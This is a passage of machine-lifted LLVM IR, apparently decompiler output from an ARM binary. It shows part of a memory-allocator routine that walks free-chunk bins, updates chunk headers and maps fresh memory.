  store i32 %v1_cab0, i32* %r1.global-to-local, align 4
  store i32 %v1_ca88, i32* %r4.global-to-local, align 4
  %v2_cab8 = add i32 %v0_ca88, 4
  %v3_cab8 = inttoptr i32 %v2_cab8 to i32*
  store i32 %v1_caac, i32* %v3_cab8, align 4
  %v0_cabc = load i32, i32* %r2.global-to-local, align 4
  %v1_cabc = load i32, i32* @r6, align 4
  %v2_cabc = add i32 %v1_cabc, 8
  %v3_cabc = inttoptr i32 %v2_cabc to i32*
  store i32 %v0_cabc, i32* %v3_cabc, align 4
  %v0_cac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cac0 = load i32, i32* @r6, align 4
  %v2_cac0 = add i32 %v1_cac0, 12
  %v3_cac0 = inttoptr i32 %v2_cac0 to i32*
  store i32 %v0_cac0, i32* %v3_cac0, align 4
  %v0_cac4 = load i32, i32* %lr.global-to-local, align 4
  %v1_cac4 = load i32, i32* %r2.global-to-local, align 4
  %v3_cac4 = add i32 %v1_cac4, %v0_cac4
  %v4_cac4 = inttoptr i32 %v3_cac4 to i32*
  store i32 %v0_cac4, i32* %v4_cac4, align 4
  %v0_cac8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cac8 = load i32, i32* %r2.global-to-local, align 4
  %v2_cac8 = add i32 %v1_cac8, 4
  %v3_cac8 = inttoptr i32 %v2_cac8 to i32*
  store i32 %v0_cac8, i32* %v3_cac8, align 4
  %v0_cacc = load i32, i32* @r6, align 4
  %v1_cacc = load i32, i32* %r2.global-to-local, align 4
  %v2_cacc = add i32 %v1_cacc, 12
  %v3_cacc = inttoptr i32 %v2_cacc to i32*
  store i32 %v0_cacc, i32* %v3_cacc, align 4
  %v0_cad0 = load i32, i32* @r6, align 4
  %v1_cad0 = load i32, i32* %r2.global-to-local, align 4
  %v2_cad0 = add i32 %v1_cad0, 8
  %v3_cad0 = inttoptr i32 %v2_cad0 to i32*
  store i32 %v0_cad0, i32* %v3_cad0, align 4
  br label %dec_label_pc_d064

dec_label_pc_cadc:                                ; preds = %dec_label_pc_ca44, %dec_label_pc_ca34
  %v1_ca6c = phi i32 [ %storemerge.pre, %dec_label_pc_ca34 ], [ %v3_ca50, %dec_label_pc_ca44 ]
  store i32 %v1_ca6c, i32* %ip.global-to-local, align 4
  %v9_cadc = icmp eq i32 %v1_ca6c, %v1_ca38
  br i1 %v9_cadc, label %dec_label_pc_cae4.loopexit, label %dec_label_pc_ca44

dec_label_pc_cae4.loopexit:                       ; preds = %dec_label_pc_cadc
  br label %dec_label_pc_cae4

dec_label_pc_cae4:                                ; preds = %dec_label_pc_ca2c.dec_label_pc_cae4_crit_edge, %dec_label_pc_cae4.loopexit
  %v4_cb14.pre-phi = phi i32 [ %.pre200, %dec_label_pc_ca2c.dec_label_pc_cae4_crit_edge ], [ %v4_ca34, %dec_label_pc_cae4.loopexit ]
  %v1_cae4 = add i32 %v0_cae4.pre, 1
  store i32 %v1_cae4, i32* %r2.global-to-local, align 4
  %v1_cae8 = urem i32 %v1_cae4, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r0.global-to-local, align 4
  %v6_caf4 = shl i32 1, %v1_cae8
  store i32 %v6_caf4, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_cafc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cafc, i32* %r3.global-to-local, align 4
  %v3_cb00 = udiv i32 %v1_cae4, 32
  store i32 %v3_cb00, i32* @r5, align 4
  %v4_cb04 = mul nuw nsw i32 %v3_cb00, 4
  %v5_cb04 = add i32 %v4_cafc, %v4_cb04
  store i32 %v5_cb04, i32* %r2.global-to-local, align 4
  %v1_cb08 = add i32 %v5_cb04, 820
  %v2_cb08 = inttoptr i32 %v1_cb08 to i32*
  %v3_cb08 = load i32, i32* %v2_cb08, align 4
  store i32 %v3_cb08, i32* @r4, align 4
  %v1_cb0c = add i32 %v4_cafc, 52
  store i32 %v1_cb0c, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_cb14 = add i32 %v1_cb0c, %v4_cb14.pre-phi
  store i32 %v5_cb14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb18

dec_label_pc_cb18:                                ; preds = %dec_label_pc_cb80, %dec_label_pc_cae4
  %v1_cb20 = phi i32 [ %v1_cb20.pre, %dec_label_pc_cb80 ], [ %v3_cb08, %dec_label_pc_cae4 ]
  %v0_cb20 = phi i32 [ %v0_cb18.pre, %dec_label_pc_cb80 ], [ %v6_caf4, %dec_label_pc_cae4 ]
  %v1_cb18 = sub i32 1, %v0_cb20
  %v2_cb18 = icmp ult i32 %v0_cb20, 2
  %v1_cb18. = select i1 %v2_cb18, i32 %v1_cb18, i32 0
  store i32 %v1_cb18., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_cb20, %v1_cb20
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_cb18
  %v5_cb24 = or i32 %v1_cb18., 1
  store i32 %v5_cb24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cb30.preheader

bb142:                                            ; preds = %dec_label_pc_cb18
  %v2_cb28 = icmp eq i32 %v1_cb18., 0
  br i1 %v2_cb28, label %.dec_label_pc_cb6c.preheader_crit_edge, label %dec_label_pc_cb30.preheader

.dec_label_pc_cb6c.preheader_crit_edge:           ; preds = %bb142
  %v0_cb6454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb6c.preheader

dec_label_pc_cb30.preheader:                      ; preds = %bb142, %.thread12
  %v0_cb30.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_cb30

dec_label_pc_cb30:                                ; preds = %dec_label_pc_cb30.preheader, %dec_label_pc_cb3c
  %v0_cb30 = phi i32 [ %v0_cb30.pre, %dec_label_pc_cb30.preheader ], [ %v1_cb30, %dec_label_pc_cb3c ]
  %v1_cb30 = add i32 %v0_cb30, 1
  store i32 %v1_cb30, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_cb30, 2
  br i1 %tmp208, label %dec_label_pc_cc10.loopexit, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb30
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r3.global-to-local, align 4
  %v1_cb40 = load i32, i32* @r8, align 4
  %v2_cb40 = add i32 %v1_cb40, ptrtoint (i32* @global_var_1d280.213 to i32)
  %v3_cb40 = inttoptr i32 %v2_cb40 to i32*
  %v4_cb40 = load i32, i32* %v3_cb40, align 4
  store i32 %v4_cb40, i32* %r2.global-to-local, align 4
  %v4_cb44 = mul i32 %v1_cb30, 4
  %v5_cb44 = add i32 %v4_cb40, %v4_cb44
  store i32 %v5_cb44, i32* %r3.global-to-local, align 4
  %v1_cb48 = add i32 %v5_cb44, 820
  %v2_cb48 = inttoptr i32 %v1_cb48 to i32*
  %v3_cb48 = load i32, i32* %v2_cb48, align 4
  store i32 %v3_cb48, i32* @r4, align 4
  %v2_cb4c = icmp eq i32 %v3_cb48, 0
  br i1 %v2_cb4c, label %dec_label_pc_cb30, label %dec_label_pc_cb54

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb3c
  %v4_cb54 = mul i32 %v1_cb30, 256
  %v5_cb54 = add i32 %v4_cb40, %v4_cb54
  store i32 %v5_cb54, i32* %r3.global-to-local, align 4
  %v1_cb58 = add i32 %v5_cb54, 44
  store i32 %v1_cb58, i32* %r0.global-to-local, align 4
  %v0_cb5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_cb5c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_cb6c.preheader

dec_label_pc_cb6c.preheader:                      ; preds = %.dec_label_pc_cb6c.preheader_crit_edge, %dec_label_pc_cb54
  %v0_cb6454 = phi i32 [ %v1_cb58, %dec_label_pc_cb54 ], [ %v0_cb6454.pre, %.dec_label_pc_cb6c.preheader_crit_edge ]
  %v0_cb88 = phi i32 [ %v3_cb48, %dec_label_pc_cb54 ], [ %v1_cb20, %.dec_label_pc_cb6c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_cb5c, %dec_label_pc_cb54 ], [ %v0_cb20, %.dec_label_pc_cb6c.preheader_crit_edge ]
  %v2_cb6c51 = and i32 %ip.promoted, %v0_cb88
  %v4_cb6c53 = icmp eq i32 %v2_cb6c51, 0
  br i1 %v4_cb6c53, label %dec_label_pc_cb64, label %dec_label_pc_cb74

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb6c.preheader, %dec_label_pc_cb64
  %v2_cb6856 = phi i32 [ %v2_cb68, %dec_label_pc_cb64 ], [ %ip.promoted, %dec_label_pc_cb6c.preheader ]
  %v0_cb6455 = phi i32 [ %v1_cb64, %dec_label_pc_cb64 ], [ %v0_cb6454, %dec_label_pc_cb6c.preheader ]
  %v1_cb64 = add i32 %v0_cb6455, 8
  %v2_cb68 = mul i32 %v2_cb6856, 2
  %v2_cb6c = and i32 %v2_cb68, %v0_cb88
  %v4_cb6c = icmp eq i32 %v2_cb6c, 0
  br i1 %v4_cb6c, label %dec_label_pc_cb64, label %dec_label_pc_cb6c.dec_label_pc_cb74_crit_edge

dec_label_pc_cb6c.dec_label_pc_cb74_crit_edge:    ; preds = %dec_label_pc_cb64
  store i32 %v1_cb64, i32* %r0.global-to-local, align 4
  store i32 %v2_cb68, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_cb74

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb6c.dec_label_pc_cb74_crit_edge, %dec_label_pc_cb6c.preheader
  %v0_cb94 = phi i32 [ %v2_cb68, %dec_label_pc_cb6c.dec_label_pc_cb74_crit_edge ], [ %ip.promoted, %dec_label_pc_cb6c.preheader ]
  %v0_cbb8 = phi i32 [ %v1_cb64, %dec_label_pc_cb6c.dec_label_pc_cb74_crit_edge ], [ %v0_cb6454, %dec_label_pc_cb6c.preheader ]
  %v1_cb74 = add i32 %v0_cbb8, 12
  %v2_cb74 = inttoptr i32 %v1_cb74 to i32*
  %v3_cb74 = load i32, i32* %v2_cb74, align 4
  store i32 %v3_cb74, i32* @lr, align 4
  %v9_cb78 = icmp eq i32 %v3_cb74, %v0_cbb8
  br i1 %v9_cb78, label %dec_label_pc_cb80, label %dec_label_pc_cba0

dec_label_pc_cb80:                                ; preds = %dec_label_pc_cb74
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r0.global-to-local, align 4
  %v1_cb84 = load i32, i32* @r8, align 4
  %v2_cb84 = add i32 %v1_cb84, ptrtoint (i32* @global_var_1d280.213 to i32)
  %v3_cb84 = inttoptr i32 %v2_cb84 to i32*
  %v4_cb84 = load i32, i32* %v3_cb84, align 4
  %v2_cb88 = sub i32 -1, %v0_cb94
  %v3_cb88 = and i32 %v0_cb88, %v2_cb88
  store i32 %v3_cb88, i32* @r4, align 4
  %v1_cb8c = load i32, i32* @r5, align 4
  %v4_cb8c = mul i32 %v1_cb8c, 4
  %v5_cb8c = add i32 %v4_cb8c, %v4_cb84
  store i32 %v5_cb8c, i32* %r3.global-to-local, align 4
  %v1_cb90 = add i32 %v0_cbb8, 8
  store i32 %v1_cb90, i32* %r0.global-to-local, align 4
  %v2_cb94 = mul i32 %v0_cb94, 2
  store i32 %v2_cb94, i32* %ip.global-to-local, align 4
  %v2_cb98 = add i32 %v5_cb8c, 820
  %v3_cb98 = inttoptr i32 %v2_cb98 to i32*
  store i32 %v3_cb88, i32* %v3_cb98, align 4
  %v0_cb18.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_cb20.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cb18

dec_label_pc_cba0:                                ; preds = %dec_label_pc_cb74
  %v1_cba0 = add i32 %v3_cb74, 4
  %v2_cba0 = inttoptr i32 %v1_cba0 to i32*
  %v3_cba0 = load i32, i32* %v2_cba0, align 4
  store i32 %v3_cba0, i32* %r3.global-to-local, align 4
  %v1_cba4 = and i32 %v3_cba0, -4
  store i32 %v1_cba4, i32* %r2.global-to-local, align 4
  %v0_cba8 = load i32, i32* @sl, align 4
  %v2_cba8 = sub i32 %v1_cba4, %v0_cba8
  store i32 %v2_cba8, i32* %ip.global-to-local, align 4
  %v1_cbac = add i32 %v3_cb74, 12
  %v2_cbac = inttoptr i32 %v1_cbac to i32*
  %v3_cbac = load i32, i32* %v2_cbac, align 4
  store i32 %v3_cbac, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_cba8, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_cba0
  %v6_cbb4 = add i32 %v1_cba4, %v3_cb74
  store i32 %v6_cbb4, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_cba0, %bb143
  %v2_cbb8 = add i32 %v3_cbac, 8
  %v3_cbb8 = inttoptr i32 %v2_cbb8 to i32*
  store i32 %v0_cbb8, i32* %v3_cbb8, align 4
  %v0_cbbc = load i32, i32* %r3.global-to-local, align 4
  %v1_cbbc = load i32, i32* %r0.global-to-local, align 4
  %v2_cbbc = add i32 %v1_cbbc, 12
  %v3_cbbc = inttoptr i32 %v2_cbbc to i32*
  store i32 %v0_cbbc, i32* %v3_cbbc, align 4
  %v4_cbc0 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_ca9c_crit_edge, label %dec_label_pc_cbcc

.dec_label_pc_ca9c_crit_edge:                     ; preds = %bb144
  %v5_cbc0 = add i32 %v4_cbc0, 8
  store i32 %v5_cbc0, i32* %r4.global-to-local, align 4
  %v4_cbc4 = load i32, i32* %r2.global-to-local, align 4
  %v5_cbc4 = add i32 %v4_cbc4, 4
  %v6_cbc4 = inttoptr i32 %v5_cbc4 to i32*
  %v7_cbc4 = load i32, i32* %v6_cbc4, align 4
  store i32 %v7_cbc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ca9c

dec_label_pc_cbcc:                                ; preds = %bb144
  %v1_cbcc = load i32, i32* @sl, align 4
  %v2_cbcc = add i32 %v1_cbcc, %v4_cbc0
  store i32 %v2_cbcc, i32* %r1.global-to-local, align 4
  %v1_cbd4 = load i32, i32* @r6, align 4
  %v2_cbd4 = add i32 %v1_cbd4, 8
  %v3_cbd4 = inttoptr i32 %v2_cbd4 to i32*
  store i32 %v2_cbcc, i32* %v3_cbd4, align 4
  %v0_cbd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cbd8 = load i32, i32* @r6, align 4
  %v2_cbd8 = add i32 %v1_cbd8, 12
  %v3_cbd8 = inttoptr i32 %v2_cbd8 to i32*
  store i32 %v0_cbd8, i32* %v3_cbd8, align 4
  %v0_cbdc = load i32, i32* @r6, align 4
  %v1_cbdc = load i32, i32* %r1.global-to-local, align 4
  %v2_cbdc = add i32 %v1_cbdc, 8
  %v3_cbdc = inttoptr i32 %v2_cbdc to i32*
  store i32 %v0_cbdc, i32* %v3_cbdc, align 4
  %v0_cbe0 = load i32, i32* @r6, align 4
  %v1_cbe0 = load i32, i32* %r1.global-to-local, align 4
  %v2_cbe0 = add i32 %v1_cbe0, 12
  %v3_cbe0 = inttoptr i32 %v2_cbe0 to i32*
  store i32 %v0_cbe0, i32* %v3_cbe0, align 4
  %tmp210 = icmp ult i32 %v1_cbcc, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_cbcc
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v8_cbec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v8_cbec, i32* %r3.global-to-local, align 4
  %v4_cbf0 = load i32, i32* %r1.global-to-local, align 4
  %v6_cbf0 = add i32 %v8_cbec, 48
  %v7_cbf0 = inttoptr i32 %v6_cbf0 to i32*
  store i32 %v4_cbf0, i32* %v7_cbf0, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_cbcc, %bb145
  %v0_cbf4 = load i32, i32* @sl, align 4
  %v1_cbf4 = or i32 %v0_cbf4, 1
  store i32 %v1_cbf4, i32* %r2.global-to-local, align 4
  %v0_cbf8 = load i32, i32* %ip.global-to-local, align 4
  %v1_cbf8 = or i32 %v0_cbf8, 1
  store i32 %v1_cbf8, i32* %r3.global-to-local, align 4
  %v0_cbfc = load i32, i32* @lr, align 4
  %v1_cbfc = add i32 %v0_cbfc, 8
  store i32 %v1_cbfc, i32* %r4.global-to-local, align 4
  %v2_cc00 = add i32 %v0_cbfc, 4
  %v3_cc00 = inttoptr i32 %v2_cc00 to i32*
  store i32 %v1_cbf4, i32* %v3_cc00, align 4
  %v0_cc04 = load i32, i32* %ip.global-to-local, align 4
  %v1_cc04 = load i32, i32* %r1.global-to-local, align 4
  %v3_cc04 = add i32 %v1_cc04, %v0_cc04
  %v4_cc04 = inttoptr i32 %v3_cc04 to i32*
  store i32 %v0_cc04, i32* %v4_cc04, align 4
  %v0_cc08 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc08 = load i32, i32* %r1.global-to-local, align 4
  %v2_cc08 = add i32 %v1_cc08, 4
  %v3_cc08 = inttoptr i32 %v2_cc08 to i32*
  store i32 %v0_cc08, i32* %v3_cc08, align 4
  br label %dec_label_pc_d064

dec_label_pc_cc10.loopexit:                       ; preds = %dec_label_pc_cb30
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cc10.loopexit, %dec_label_pc_c824, %dec_label_pc_c82c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  %v4_cc18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cc18, i32* @r0, align 4
  %v1_cc1c = add i32 %v4_cc18, 44
  %v2_cc1c = inttoptr i32 %v1_cc1c to i32*
  %v3_cc1c = load i32, i32* %v2_cc1c, align 4
  store i32 %v3_cc1c, i32* %ip.global-to-local, align 4
  %v1_cc20 = add i32 %v3_cc1c, 4
  %v2_cc20 = inttoptr i32 %v1_cc20 to i32*
  %v3_cc20 = load i32, i32* %v2_cc20, align 4
  %v0_cc24 = load i32, i32* @sl, align 4
  %v1_cc24 = add i32 %v0_cc24, 16
  store i32 %v1_cc24, i32* %r1.global-to-local, align 4
  %v1_cc28 = and i32 %v3_cc20, -4
  store i32 %v1_cc28, i32* %r3.global-to-local, align 4
  %v3_cc2c = icmp ult i32 %v1_cc28, %v1_cc24
  br i1 %v3_cc2c, label %dec_label_pc_cc5c, label %dec_label_pc_cc38

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc10
  %v2_cc38 = sub i32 %v1_cc28, %v0_cc24
  %v2_cc3c = add i32 %v0_cc24, %v3_cc1c
  store i32 %v2_cc3c, i32* %r1.global-to-local, align 4
  %v1_cc40 = or i32 %v2_cc38, 1
  store i32 %v1_cc40, i32* %r3.global-to-local, align 4
  %v1_cc44 = or i32 %v0_cc24, 1
  store i32 %v1_cc44, i32* %r2.global-to-local, align 4
  %v1_cc48 = add i32 %v3_cc1c, 8
  store i32 %v1_cc48, i32* %r4.global-to-local, align 4
  store i32 %v1_cc44, i32* %v2_cc20, align 4
  %v0_cc50 = load i32, i32* %r1.global-to-local, align 4
  %v1_cc50 = load i32, i32* @r0, align 4
  %v2_cc50 = add i32 %v1_cc50, 44
  %v3_cc50 = inttoptr i32 %v2_cc50 to i32*
  store i32 %v0_cc50, i32* %v3_cc50, align 4
  %v0_cc54 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc54 = load i32, i32* %r1.global-to-local, align 4
  %v2_cc54 = add i32 %v1_cc54, 4
  %v3_cc54 = inttoptr i32 %v2_cc54 to i32*
  store i32 %v0_cc54, i32* %v3_cc54, align 4
  br label %dec_label_pc_d064

dec_label_pc_cc5c:                                ; preds = %dec_label_pc_cc10
  %v1_cc5c = inttoptr i32 %v4_cc18 to i32*
  %v2_cc5c = load i32, i32* %v1_cc5c, align 4
  store i32 %v2_cc5c, i32* %r3.global-to-local, align 4
  %v1_cc60 = and i32 %v2_cc5c, 2
  store i32 %v1_cc60, i32* %ip.global-to-local, align 4
  %v2_cc60 = icmp eq i32 %v1_cc60, 0
  %v1_cc64 = add i32 %v4_cc18, 860
  %v2_cc64 = inttoptr i32 %v1_cc64 to i32*
  %v3_cc64 = load i32, i32* %v2_cc64, align 4
  store i32 %v3_cc64, i32* %r1.global-to-local, align 4
  br i1 %v2_cc60, label %dec_label_pc_cc7c, label %dec_label_pc_cc6c

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc5c
  %v0_cc6c = call i32 @function_d2a4()
  %v0_cc70 = load i32, i32* @sl, align 4
  %v1_cc70 = add i32 %v0_cc70, -7
  store i32 %v1_cc70, i32* %r0.global-to-local, align 4
  %v1_cc74 = call i32 @function_c77c(i32 %v1_cc70)
  store i32 %v1_cc74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d060

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc5c
  %v1_cc7c = add i32 %v4_cc18, 844
  %v2_cc7c = inttoptr i32 %v1_cc7c to i32*
  %v3_cc7c = load i32, i32* %v2_cc7c, align 4
  store i32 %v3_cc7c, i32* %r3.global-to-local, align 4
  %v3_cc80 = icmp ult i32 %v0_cc24, %v3_cc7c
  %v1_cc84 = add i32 %v3_cc64, -1
  store i32 %v1_cc84, i32* %sb.global-to-local, align 4
  br i1 %v3_cc80, label %dec_label_pc_cd58, label %dec_label_pc_cc8c

dec_label_pc_cc8c:                                ; preds = %dec_label_pc_cc7c
  %v1_cc8c = add i32 %v4_cc18, 852
  %v2_cc8c = inttoptr i32 %v1_cc8c to i32*
  %v3_cc8c = load i32, i32* %v2_cc8c, align 4
  store i32 %v3_cc8c, i32* %r2.global-to-local, align 4
  %v1_cc90 = add i32 %v4_cc18, 848
  %v2_cc90 = inttoptr i32 %v1_cc90 to i32*
  %v3_cc90 = load i32, i32* %v2_cc90, align 4
  store i32 %v3_cc90, i32* %r3.global-to-local, align 4
  %v6_cc98 = icmp slt i32 %v3_cc90, %v3_cc8c
  br i1 %v6_cc98, label %dec_label_pc_cc9c, label %dec_label_pc_cd58

dec_label_pc_cc9c:                                ; preds = %dec_label_pc_cc8c
  %v1_cc9c = add i32 %v0_cc24, 10
  %v2_cca0 = add i32 %v1_cc9c, %v3_cc64
  store i32 %v2_cca0, i32* %r3.global-to-local, align 4
  %v2_cca4 = sub i32 0, %v3_cc64
  %v3_cca4 = and i32 %v2_cca0, %v2_cca4
  store i32 %v3_cca4, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_cca4, %v0_cc24
  br i1 %tmp211, label %dec_label_pc_ccb0, label %dec_label_pc_cd58

dec_label_pc_ccb0:                                ; preds = %dec_label_pc_cc9c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_cca4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_ccc8 = call i32 @function_effc(i32 0, i32 %v3_cca4, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_ccc8, i32* %r0.global-to-local, align 4
  %v7_cccc = icmp eq i32 %v6_ccc8, -1
  br i1 %v7_cccc, label %dec_label_pc_ccb0.dec_label_pc_cd58_crit_edge, label %dec_label_pc_ccd4

dec_label_pc_ccb0.dec_label_pc_cd58_crit_edge:    ; preds = %dec_label_pc_ccb0
  %v1_cd7c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_cd58

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_ccb0
  %v1_ccd4 = urem i32 %v6_ccc8, 8
  store i32 %v1_ccd4, i32* %r2.global-to-local, align 4
  %v2_ccd4 = icmp eq i32 %v1_ccd4, 0
  br i1 %v2_ccd4, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_ccd4
  %v2_ccd8 = sub nsw i32 8, %v1_ccd4
  store i32 %v2_ccd8, i32* %r3.global-to-local, align 4
  %v2_ccdc = load i32, i32* @r4, align 4
  %v3_ccdc = sub i32 %v2_ccdc, %v2_ccd8
  %v3_cce0 = add i32 %v2_ccd8, %v6_ccc8
  store i32 %v3_cce0, i32* %lr.global-to-local, align 4
  %v2_cce8 = or i32 %v3_ccdc, 2
  store i32 %v2_cce8, i32* %r2.global-to-local, align 4
  %v5_ccf0 = inttoptr i32 %v3_cce0 to i32*
  store i32 %v2_ccd8, i32* %v5_ccf0, align 4
  %v1_ccf4 = load i32, i32* %r2.global-to-local, align 4
  %v2_ccf4 = load i32, i32* %lr.global-to-local, align 4
  %v3_ccf4 = add i32 %v2_ccf4, 4
  %v4_ccf4 = inttoptr i32 %v3_ccf4 to i32*
  store i32 %v1_ccf4, i32* %v4_ccf4, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_ccd4
  store i32 %v6_ccc8, i32* %lr.global-to-local, align 4
  %v1_ccec47 = load i32, i32* @r4, align 4
  %v2_ccec48 = or i32 %v1_ccec47, 2
  store i32 %v2_ccec48, i32* %r3.global-to-local, align 4
  %v3_ccf8 = inttoptr i32 %v6_ccc8 to i32*
  store i32 0, i32* %v3_ccf8, align 4
  %v1_ccfc = load i32, i32* %r3.global-to-local, align 4
  %v2_ccfc = load i32, i32* %lr.global-to-local, align 4
  %v3_ccfc = add i32 %v2_ccfc, 4
  %v4_ccfc = inttoptr i32 %v3_ccfc to i32*
  store i32 %v1_ccfc, i32* %v4_ccfc, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_cd08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_cd08, i32* %ip.global-to-local, align 4
  %v1_cd0c = add i32 %v4_cd08, 848
  %v2_cd0c = inttoptr i32 %v1_cd0c to i32*
  %v3_cd0c = load i32, i32* %v2_cd0c, align 4
  store i32 %v3_cd0c, i32* %r3.global-to-local, align 4
  %v1_cd10 = add i32 %v4_cd08, 856
  %v2_cd10 = inttoptr i32 %v1_cd10 to i32*
  %v3_cd10 = load i32, i32* %v2_cd10, align 4
  store i32 %v3_cd10, i32* %r2.global-to-local, align 4
  %v1_cd14 = add i32 %v3_cd0c, 1
  store i32 %v1_cd14, i32* %r3.global-to-local, align 4
  %v7_cd1c = icmp sgt i32 %v1_cd14, %v3_cd10
  br i1 %v7_cd1c, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_cd14, i32* %v2_cd10, align 4
  %v0_cd20.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_cd20.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_cd20 = phi i32 [ %v4_cd08, %.thread27 ], [ %v1_cd20.pre, %bb147 ]
  %v0_cd20 = phi i32 [ %v1_cd14, %.thread27 ], [ %v0_cd20.pre, %bb147 ]
  %v2_cd20 = add i32 %v1_cd20, 848
  %v3_cd20 = inttoptr i32 %v2_cd20 to i32*
  store i32 %v0_cd20, i32* %v3_cd20, align 4
  %v0_cd24 = load i32, i32* %ip.global-to-local, align 4
  %v1_cd24 = add i32 %v0_cd24, 868
  %v2_cd24 = inttoptr i32 %v1_cd24 to i32*
  %v3_cd24 = load i32, i32* %v2_cd24, align 4
  store i32 %v3_cd24, i32* %r3.global-to-local, align 4
  %v1_cd28 = add i32 %v0_cd24, 880
  %v2_cd28 = inttoptr i32 %v1_cd28 to i32*
  %v3_cd28 = load i32, i32* %v2_cd28, align 4
  store i32 %v3_cd28, i32* %r2.global-to-local, align 4
  %v0_cd2c = load i32, i32* @r4, align 4
  %v2_cd2c = add i32 %v0_cd2c, %v3_cd24
  store i32 %v2_cd2c, i32* %r1.global-to-local, align 4
  %v1_cd30 = add i32 %v0_cd24, 872
  %v2_cd30 = inttoptr i32 %v1_cd30 to i32*
  %v3_cd30 = load i32, i32* %v2_cd30, align 4
  store i32 %v3_cd30, i32* %r3.global-to-local, align 4
  %v1_cd38 = add i32 %v0_cd24, 884
  %v2_cd38 = inttoptr i32 %v1_cd38 to i32*
  %v3_cd38 = load i32, i32* %v2_cd38, align 4
  store i32 %v3_cd38, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_cd2c, %v3_cd28
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_cd2c, i32* %v2_cd28, align 4
  %v0_cd40.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_cd40.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_cd40 = phi i32 [ %v0_cd24, %bb148 ], [ %v1_cd40.pre, %bb149 ]
  %v0_cd40 = phi i32 [ %v2_cd2c, %bb148 ], [ %v0_cd40.pre, %bb149 ]
  %v2_cd40 = add i32 %v1_cd40, 868
  %v3_cd40 = inttoptr i32 %v2_cd40 to i32*
  store i32 %v0_cd40, i32* %v3_cd40, align 4
  %v0_cd44 = load i32, i32* %r1.global-to-local, align 4
  %v1_cd44 = load i32, i32* %r3.global-to-local, align 4
  %v2_cd44 = add i32 %v1_cd44, %v0_cd44
  store i32 %v2_cd44, i32* %r1.global-to-local, align 4
